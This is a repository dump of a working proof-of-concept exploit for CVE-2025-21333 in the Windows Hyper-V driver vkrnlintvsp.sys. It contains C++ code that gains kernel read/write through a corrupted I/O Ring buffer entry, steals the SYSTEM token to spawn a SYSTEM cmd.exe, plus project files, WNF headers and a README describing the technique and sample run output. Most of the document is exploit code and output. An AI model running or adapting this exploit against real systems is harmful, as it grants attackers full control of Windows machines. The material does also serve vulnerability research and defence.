    KRead((PVOID)(deviceObject + 0x8), reinterpret_cast<PBYTE>(&driverObject), sizeof(driverObject));
    //std::cout << "[*] driverObject: " << std::hex << deviceObject << std::endl;

    //get Npfs!NpFsdCreate
    KRead((PVOID)(driverObject + 0x70), reinterpret_cast<PBYTE>(&pNpFsdCreate), sizeof(pNpFsdCreate));
    //std::cout << "[*] Npfs!NpFsdCreate: " << std::hex << pNpFsdCreate << std::endl;
    std::cout << "[*] base of npfs.sys: " << std::hex << pNpFsdCreate - NPFS_NPFSDCREATE_OFFSET << std::endl;

    //get ExAllocatePool2
    KRead((PVOID)(pNpFsdCreate - NPFS_NPFSDCREATE_OFFSET + NPFS_GOT_ALLOCATEPOOL2_OFFSET), reinterpret_cast<PBYTE>(&pExAllocatePool2), sizeof(pExAllocatePool2));
    //std::cout << "[*] ExAllocatePool2 : " << std::hex << pExAllocatePool2 << std::endl;
    std::cout << "[*] base of ntoskrnl.exe: " << std::hex << pExAllocatePool2 - NT_ALLOCATEPOOL2_OFFSET << std::endl;
    //std::cout << "[*] system EPROCESS ptr: " << std::hex << pExAllocatePool2 - NT_ALLOCATEPOOL2_OFFSET + NT_INITIALSYSTEMPROCESS_OFFSET << std::endl;

    //get system EPRCOESS
    KRead((PVOID)(pExAllocatePool2 - NT_ALLOCATEPOOL2_OFFSET + NT_INITIALSYSTEMPROCESS_OFFSET), reinterpret_cast<PBYTE>(&system_eproc), sizeof(system_eproc));
    std::cout << "[*] system EPROCESS: " << std::hex << system_eproc << std::endl;

    KRead((PVOID)(system_eproc + EPROCESS_TOKEN_OFFSET), reinterpret_cast<PBYTE>(&system_token), sizeof(system_token));
    system_token &= 0xfffffffffffffff0;
    std::cout << "[*] system TOKEN: " << std::hex << system_token << std::endl;


    std::cout << "[*] curpid: " << curpid << std::endl;

    cur_eproc = system_eproc;
    while (1) {
        //std::cout << "[*] cur_eproc: " << std::hex << cur_eproc << std::endl;
        KRead((PVOID)(cur_eproc + EPROCESS_UNIQUEPROCESSID_OFFSET), reinterpret_cast<PBYTE>(&pid), sizeof(pid));
        //std::cout << "[*] pid: " << pid << std::endl;
        if (pid == curpid) {
            break;
        }
        KRead((PVOID)(cur_eproc + EPROCESS_FLINK_OFFSET), reinterpret_cast<PBYTE>(&cur_eproc), sizeof(cur_eproc));
        cur_eproc -= EPROCESS_FLINK_OFFSET;
    }

    cur_token_ptr = cur_eproc + EPROCESS_TOKEN_OFFSET;

    KWrite((PVOID)cur_token_ptr, reinterpret_cast<PBYTE>(&system_token), sizeof(system_token));

    system("cmd.exe");

    ////getchar();

    //freeing everything

    result = fNtUpdateWnfStateData(&(regBuffersControllerWNF->state), backup_buffer, WNF_MAX_DATA_SIZE, 0, 0, 0, 0);
    if (result != 0) {
        std::cout << "fNtUpdateWnfStateData on max_corrupted returned " << std::hex << result << std::endl;
    }

    //restoring original buffer entry
    regBuffersAddr[0] = reinterpret_cast<IOP_MC_BUFFER_ENTRY*>(original_regBufferEntry);

    result = fNtUpdateWnfStateData(&(regBuffersControllerWNF->state), buffer, WNF_MAX_DATA_SIZE, 0, 0, 0, 0);
    if (result != 0) {
        std::cout << "fNtUpdateWnfStateData on tokenControllerWNF returned " << std::hex << result << std::endl;
    }

    std::cout << "calling NtUpdateWnfStateData returned successfully" << std::endl;

    //cleanup
    for (int i = 0; i < IORINGS_SIZE; i++) {
        result = CloseIoRing(reinterpret_cast<HIORING>(iorings[i]));
        if (!SUCCEEDED(result)) {
            printf("[-] Failed CloseIoRing: 0x%x\n", result);
            return FALSE;
        }
    }

    for (int i = 0; i < SPRAY_PIPE_COUNT; i++) {
        if (!CloseHandle(spray_pipes[i].pipe_read)) {
            std::cout << "CloseHandle failed with error 0x" << std::hex << result << std::endl;
        }
        if (!CloseHandle(spray_pipes[i].pipe_write)) {
            std::cout << "CloseHandle failed with error 0x" << std::hex << result << std::endl;
        }
    }

    for (auto& state : statenames1) {
        result = fNtDeleteWnfStateName(&state);
        if (result != 0) {
            std::cout << "NtDeleteWnfStateName returned " << std::hex << result << std::endl;
        }
    }

    for (auto& state : statenames2) {
        result = fNtDeleteWnfStateName(&state);
        if (result != 0) {
            std::cout << "NtDeleteWnfStateName returned " << std::hex << result << std::endl;
        }
    }

    for (auto& state : statenames3) {
        result = fNtDeleteWnfStateName(&state);
        if (result != 0) {
            std::cout << "NtDeleteWnfStateName returned " << std::hex << result << std::endl;
        }
    }
    //std::cout << Hexdump(buffer, max_corrupted->get()->dataSize) << std::endl << std::endl;

    return 0;
}

```

`CVE-2025-21333-POC/CVE-2025-21333-POC.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|Win32">
      <Configuration>Debug</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|Win32">
      <Configuration>Release</Configuration>
      <Platform>Win32</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>17.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{5592eaea-f200-4fd7-bb63-12b9b6f72da3}</ProjectGuid>
    <RootNamespace>CVE202521333POC</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|Win32'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>WIN32;NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreadedDebug</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="CVE-2025-21333-POC.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Hexdump.hpp" />
    <ClInclude Include="wnf.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`CVE-2025-21333-POC/CVE-2025-21333-POC.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="File di origine">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="File di intestazione">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="File di risorse">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="CVE-2025-21333-POC.cpp">
      <Filter>File di origine</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="Hexdump.hpp">
      <Filter>File di intestazione</Filter>
    </ClInclude>
    <ClInclude Include="wnf.h">
      <Filter>File di intestazione</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`CVE-2025-21333-POC/Hexdump.hpp`:

```hpp
#ifndef HEXDUMP_HPP
#define HEXDUMP_HPP

#include <cctype>
#include <iomanip>
#include <ostream>

template <unsigned RowSize, bool ShowAscii>
struct CustomHexdump
{
    CustomHexdump(const void* data, unsigned length) :
        mData(static_cast<const unsigned char*>(data)), mLength(length) { }
    const unsigned char* mData;
    const unsigned mLength;
};

template <unsigned RowSize, bool ShowAscii>
std::ostream& operator<<(std::ostream& out, const CustomHexdump<RowSize, ShowAscii>& dump)
{
    out.fill('0');
    for (int i = 0; i < dump.mLength; i += RowSize)
    {
        out << "0x" << std::setw(6) << std::hex << i << ": ";
        for (int j = 0; j < RowSize; ++j)
        {
            if (i + j < dump.mLength)
            {
                out << std::hex << std::setw(2) << static_cast<int>(dump.mData[i + j]) << " ";
            }
            else
            {
                out << "   ";
            }
        }

        out << " ";
        if (ShowAscii)
        {
            for (int j = 0; j < RowSize; ++j)
            {
                if (i + j < dump.mLength)
                {
                    if (std::isprint(dump.mData[i + j]))
                    {
                        out << static_cast<char>(dump.mData[i + j]);
                    }
                    else
                    {
                        out << ".";
                    }
                }
            }
        }
        out << std::endl;
    }
    return out;
}

typedef CustomHexdump<16, true> Hexdump;

#endif // HEXDUMP_HPP
```

`CVE-2025-21333-POC/wnf.h`:

```h
/**
  Copyright © 2019 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
#pragma once

#include <Windows.h>

#ifndef WNF_H
#define WNF_H

#define WNF_STATE_KEY                0x41C64E6DA3BC0074

  // kernel-mode structures
#define WNF_NODE_SCOPE_MAP           0x901
#define WNF_NODE_SCOPE_INSTANCE      0x902
#define WNF_NODE_NAME_INSTANCE       0x903
#define WNF_NODE_STATE_DATA          0x904
#define WNF_NODE_SUBSCRIBE_INSTANCE  0x905
#define WNF_NODE_PROCESS_CONTEXT     0x906

// user-mode structures
#define WNF_NODE_SUBSCRIPTION_TABLE  0x911
#define WNF_NODE_NAME_SUBSCRIPTION   0x912
#define WNF_NODE_SERIALIZATION_GROUP 0x913
#define WNF_NODE_USER_SUBSCRIPTION   0x914

typedef enum _WNF_STATE_NAME_LIFETIME {
    WnfWellKnownStateName = 0x0,
    WnfPermanentStateName = 0x1,
    WnfPersistentStateName = 0x2,
    WnfTemporaryStateName = 0x3
} WNF_STATE_NAME_LIFETIME;

typedef enum _WNF_DATA_SCOPE {
    WnfDataScopeSystem = 0x0,
    WnfDataScopeSession = 0x1,
    WnfDataScopeUser = 0x2,
    WnfDataScopeProcess = 0x3,
    WnfDataScopeMachine = 0x4
} WNF_DATA_SCOPE;

typedef enum _WNF_STATE_NAME_INFORMATION {
    WnfInfoStateNameExist = 0x0,
    WnfInfoSubscribersPresent = 0x1,
    WnfInfoIsQuiescent = 0x2
} WNF_STATE_NAME_INFORMATION;

typedef struct _WNF_STATE_NAME_INTERNAL {
    ULONG64 Version : 4;
    ULONG64 NameLifetime : 2;
    ULONG64 DataScope : 4;
    ULONG64 PermanentData : 1;
    ULONG64 Unique : 53;
} WNF_STATE_NAME_INTERNAL, * PWNF_STATE_NAME_INTERNAL;

typedef ULONG LOGICAL;
typedef ULONG* PLOGICAL;

typedef struct _WNF_STATE_NAME {
    ULONG                             Data[2];
} WNF_STATE_NAME, * PWNF_STATE_NAME;

typedef const struct _WNF_STATE_NAME* PCWNF_STATE_NAME;

typedef struct _WNF_TYPE_ID {
    GUID                              TypeId;
} WNF_TYPE_ID, * PWNF_TYPE_ID;

typedef const WNF_TYPE_ID* PCWNF_TYPE_ID;

typedef ULONG WNF_CHANGE_STAMP, * PWNF_CHANGE_STAMP;

typedef struct _WNF_DELIVERY_DESCRIPTOR {
    ULONG64                           SubscriptionId;
    WNF_STATE_NAME                    StateName;
    WNF_CHANGE_STAMP                  ChangeStamp;
    ULONG                             StateDataSize;
    ULONG                             EventMask;
    WNF_TYPE_ID                       TypeId;
    ULONG                             StateDataOffset;
} WNF_DELIVERY_DESCRIPTOR, * PWNF_DELIVERY_DESCRIPTOR;

typedef struct _WNF_CONTEXT_HEADER {
    USHORT                            NodeTypeCode;
    USHORT                            NodeByteSize;
} WNF_CONTEXT_HEADER, * PWNF_CONTEXT_HEADER;

typedef struct _WNF_SUBSCRIPTION_TABLE {
    WNF_CONTEXT_HEADER                Header;
    SRWLOCK                           NamesTableLock;
    LIST_ENTRY                        NamesTableEntry;
    LIST_ENTRY                        SerializationGroupListHead;
    SRWLOCK                           SerializationGroupLock;
    DWORD                             Unknown1[2];
    DWORD                             SubscribedEventSet;
    DWORD                             Unknown2[2];
    PTP_TIMER                         Timer;
    ULONG64                           TimerDueTime;
} WNF_SUBSCRIPTION_TABLE, * PWNF_SUBSCRIPTION_TABLE;

typedef struct _WNF_NAME_SUBSCRIPTION {
    WNF_CONTEXT_HEADER                Header;
    ULONG64                           SubscriptionId;
    WNF_STATE_NAME_INTERNAL           StateName;
    WNF_CHANGE_STAMP                  CurrentChangeStamp;
    LIST_ENTRY                        NamesTableEntry;
    PWNF_TYPE_ID                      TypeId;
    SRWLOCK                           SubscriptionLock;
    LIST_ENTRY                        SubscriptionsListHead;
    ULONG                             NormalDeliverySubscriptions;
    ULONG                             NotificationTypeCount[5];
    PWNF_DELIVERY_DESCRIPTOR          RetryDescriptor;
    ULONG                             DeliveryState;
    ULONG64                           ReliableRetryTime;
} WNF_NAME_SUBSCRIPTION, * PWNF_NAME_SUBSCRIPTION;

typedef struct _WNF_SERIALIZATION_GROUP {
    WNF_CONTEXT_HEADER                Header;
    ULONG                             GroupId;
    LIST_ENTRY                        SerializationGroupList;
    ULONG64                           SerializationGroupValue;
    ULONG64                           SerializationGroupMemberCount;
} WNF_SERIALIZATION_GROUP, * PWNF_SERIALIZATION_GROUP;

typedef NTSTATUS(*PWNF_USER_CALLBACK) (
    WNF_STATE_NAME                    StateName,
    WNF_CHANGE_STAMP                  ChangeStamp,
    PWNF_TYPE_ID                      TypeId,
    PVOID                             CallbackContext,
    PVOID                             Buffer,
    ULONG                             BufferSize);

typedef struct _WNF_USER_SUBSCRIPTION {
    WNF_CONTEXT_HEADER                Header;
    LIST_ENTRY                        SubscriptionsListEntry;
    PWNF_NAME_SUBSCRIPTION            NameSubscription;
    PWNF_USER_CALLBACK                Callback;
    PVOID                             CallbackContext;
    ULONG64                           SubProcessTag;
    ULONG                             CurrentChangeStamp;
    ULONG                             DeliveryOptions;
    ULONG                             SubscribedEventSet;
    PWNF_SERIALIZATION_GROUP          SerializationGroup;
    ULONG                             UserSubscriptionCount;
    ULONG64                           Unknown[10];
} WNF_USER_SUBSCRIPTION, * PWNF_USER_SUBSCRIPTION;



typedef struct _WNF_STATE_DATA
{
    DWORD Header;                                         //0x0
    ULONG AllocatedSize;                                                    //0x4
    ULONG DataSize;                                                         //0x8
    ULONG ChangeStamp;                                                      //0xc
}WNF_STATE_DATA, *PWNF_STATE_DATA;

NTSYSCALLAPI
NTSTATUS
NTAPI
NtDeleteWnfStateName(
    _In_ PCWNF_STATE_NAME StateName
);



NTSYSCALLAPI
NTSTATUS
NTAPI
NtDeleteWnfStateData(
    _In_ PCWNF_STATE_NAME StateName,
    _In_opt_ const VOID* ExplicitScope
);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryWnfStateData(
    _In_ PCWNF_STATE_NAME StateName,
    _In_opt_ PCWNF_TYPE_ID TypeId,
    _In_opt_ const VOID* ExplicitScope,
    _Out_ PWNF_CHANGE_STAMP ChangeStamp,
    _Out_writes_bytes_to_opt_(*BufferSize, *BufferSize) PVOID Buffer,
    _Inout_ PULONG BufferSize
);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryWnfStateNameInformation(
    _In_ PCWNF_STATE_NAME StateName,
    _In_ WNF_STATE_NAME_INFORMATION NameInfoClass,
    _In_opt_ const VOID* ExplicitScope,
    _Out_writes_bytes_(InfoBufferSize) PVOID InfoBuffer,
    _In_ ULONG InfoBufferSize
);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSubscribeWnfStateChange(
    _In_ PCWNF_STATE_NAME StateName,
    _In_opt_ WNF_CHANGE_STAMP ChangeStamp,
    _In_ ULONG EventMask,
    _Out_opt_ PULONG64 SubscriptionId
);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtUnsubscribeWnfStateChange(
    _In_ PCWNF_STATE_NAME StateName
);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtGetCompleteWnfStateSubscription(
    _In_opt_ PWNF_STATE_NAME OldDescriptorStateName,
    _In_opt_ ULONG64* OldSubscriptionId,
    _In_opt_ ULONG OldDescriptorEventMask,
    _In_opt_ ULONG OldDescriptorStatus,
    _Out_writes_bytes_(DescriptorSize) PWNF_DELIVERY_DESCRIPTOR NewDeliveryDescriptor,
    _In_ ULONG DescriptorSize
);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtSetWnfProcessNotificationEvent(
    _In_ HANDLE NotificationEvent
);


typedef struct _CT_CONTEXT {
    PTP_WORK                          WorkItem;
    PWNF_USER_SUBSCRIPTION            Subscription;
    HANDLE                            hEvent;
} CT_CONTEXT, * PCT_CONTEXT;

typedef struct _tagWnfName {
    const WCHAR* Name;
    ULONG64      StateName;
} WnfName;

#endif
```

`README.md`:

```md
# CVE-2025-21333-POC

Proof of Concept that exploits [CVE-2025-21333](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-21333) in vkrnlintvsp.sys (not so reliable see Requirements and Limitations section). Under the References section are located very helpful resources for who wants to play with the exploit.

The vulnerability was detected as actively exploited by threat actors.

Tested on **Windows 11 23h2**. 

It may work also on **Windows 11 24h2** but I didn't test it.

Below the hash of the ntoskrnl.exe and vkrnlintvsp.sys that were used to test the POC.

```
PS C:\Windows\System32\drivers> get-filehash .\vkrnlintvsp.sys

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          28948C65EF108AA5B43E3D10EE7EA7602AEBA0245305796A84B4F9DBDEDDDF77       C:\Windows\System32\drivers\v...

PS C:\Windows\System32\drivers>
```

```
PS C:\Windows\System32> Get-FileHash ntoskrnl.exe

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          999C51D12CDF17A57054068D909E88E1587A9A715F15E0DE9E32F4AA4875C473       C:\Windows\System32\ntoskrnl.exe

PS C:\Windows\System32>
```

## Overwriting I/O Ring buffer entry to get arbitrary read/write

It doesn't use NtQuerySystemInformation to leak kernel addresses nor PreviousMode to get arbitrary read/write. 

Instead, It allocates in the Paged Pool an array of pointers to [_IOP_MC_BUFFER_ENTRY](https://www.vergiliusproject.com/kernels/x64/windows-11/23h2/_IOP_MC_BUFFER_ENTRY) and overwrites the first pointer with a malicious IOP_MC_BUFFER_ENTRY* located in user-space. Using _BuildIoRingWriteFile()_/_BuildIoRingReadFile()_ It is possible to obtain arbitrary read/write in the kernel. 

The array of pointers to __IOP_MC_BUFFER_ENTRY_ is an object with PoolTag **IrRB**.

The technique slightly differs from the one documented by Yarden Shafir [here](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/). Instead of taking control of the entire array pointed by _IORING_OBJECT.RegBuffers, the technique takes control **only of one entry** in the array pointed by _IORING_OBJECT.RegBuffers.

Since the size of the array of pointers is controllable by the user, this means It can be used to obtain reliable arbitrary read/write in ring0 starting from heap-overflows and UAFs for multiple LFH buckets.

I don't know if someone already shared this technique to exploit overflows or UAFs in the paged pool.

These screenshot were taken after executing the poc. The overflow was in the bucket for object size 0x50. Notice It was possible to allocate a RegBuffers array in that bucket and the first pointer points to user-space memory.

![image](https://github.com/user-attachments/assets/debfb4ce-755d-479f-9428-a69466c4b38c)

Notice the malicious entry sets the _Address_ to a process object. _Address_ corresponds to the arbitrary address that we may want to read from/write to (this already well described by Yarden Shafir's article).

![image](https://github.com/user-attachments/assets/e5d8ea28-501d-4d7e-83a7-e140e6762c89)



## Requirements and Limitations

It is necessary to turn on the **windows sandbox feature** so that the vulnerable syscalls are handled by the vulnerable driver.

![image](https://github.com/user-attachments/assets/7becbeab-446d-4f65-9761-fdd51eea4f61)

I managed to get an **overflow of 0xfff0 bytes**. I didn't manage to make the overflow length fully controllable. You can see a **crash if the overflow is bigger than the subsegment** (It may happen quite often). Maybe by spraying more objects It is possible to minimize this behavior.

The poc frees 2 WNF state data to reallocate in that positions a regBuffer (an array of pointers to [_IOP_MC_BUFFER_ENTRY](https://www.vergiliusproject.com/kernels/x64/windows-11/23h2/_IOP_MC_BUFFER_ENTRY)associated to an IORING_OBJECT) and a PipeAttribute. Sometimes, between the free and the realloc, It may happen that another object is allocated in that position by another driver. It would be possible to use other corrupted WNF state data objects in a while loop to perform multiple reallocation attempts and increase the possibility to have the desired layout.

The poc code is quite messy.

After getting system It is better to **exit from the system shell typing `exit` in the console** otherwise the **machine will crash**.

## Compile and Run

Compile x64 Release version.

Run and get a system shell.

```
PS C:\Users\unpriv> .\CVE-2025-21333-POC.exe
Preparing...
[*] fNtCreateCrossVmEvent = 00007FFD6BC31690
[*] fNtQueryInformationProcess = 00007FFD6BC304E0
[!] WindowsSandboxClient.exe process not found
[*] spawning windows sandbox
[*] CreateProcessA returned successfully
[*] NtQueryInformationProcess returned successfully
[*] peb_addr = 0000000100335000
[*] ReadProcessMemory returned successfully
[*] ProcessParameters = 00000147B06A6430
[*] ReadProcessMemory returned successfully
[*] CommandLine = 00000147B06A6ADA
[*] CommandLine_size = 3f0
[*] commandline = C:\Windows\system32\WindowsSandboxClient.exe <ContainerId>19a1ef14-ee35-47d8-8bdb-cf4c86272272</ContainerId><AccountUser>WDAGUtilityAccount</AccountUser><AccountPassword>66387310-a27d-4a59-a688-3ab018388c9e</AccountPassword><AudioInputEnabled>true</AudioInputEnabled><ClipboardRedirectionEnabled>true</ClipboardRedirectionEnabled><RebootSupported>true</RebootSupported><SmartCardRedirectionEnabled>false</SmartCardRedirectionEnabled><FullScreenMode>false</FullScreenMode><TargetDisplay>0</TargetDisplay>
[*] extracted guid = 19a1ef14-ee35-47d8-8bdb-cf4c86272272
[*] s_guid = 19a1ef14-ee35-47d8-8bdb-cf4c86272272
Created GUID
extracted guid
0x000000: 14 ef a1 19 35 ee d8 47 8b db cf 4c 86 27 22 72  ....5..G...L.'"r


guid
0x000000: 14 ef a1 19 35 ee d8 47 8b db cf 4c 86 27 22 72  ....5..G...L.'"r


Triggering vuln creating crossvmevent...
max corrupted WNF
state: a18d294541c64e6d val: 0  dataSize: 10040
calling NtqueryWnfStateData on max_corrupted with max_corrupted->state a18d2945a18d2945 and datasize10040
buffer content
[+] found WNF to be freed and replaced with RegBuffers
offset 30
[+] found WNF to be freed and replaced with PipeAttribute
offset2 80
updating regBuffersControllerWNF
calling NtUpdateWnfStateData on tokenReaderWNF->state a18d2945a18d2945 and datasize10040
calling NtUpdateWnfStateData returned successfully
[*] retrieving WNF with content 0x4343434343434343
[*] retrieving WNF with content 0x4444444444444444
searching in statenames2
found corrupted WNF: a18d514541c64e6dval: 4343434343434343
found corrupted WNF: a18d614541c64e6dval: 4444444444444444
found1 1 found2 1
found1 1 found2 1
found1 1 found2 1
0x000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0x000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0x000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  ................
0x000030: 00 00 05 0b 49 72 52 42 64 b9 76 d3 e4 ff d1 c6  ....IrRBd.v.....
0x000040: a0 a1 b1 f1 09 e3 ff ff 00 00 00 00 00 00 00 00  ................
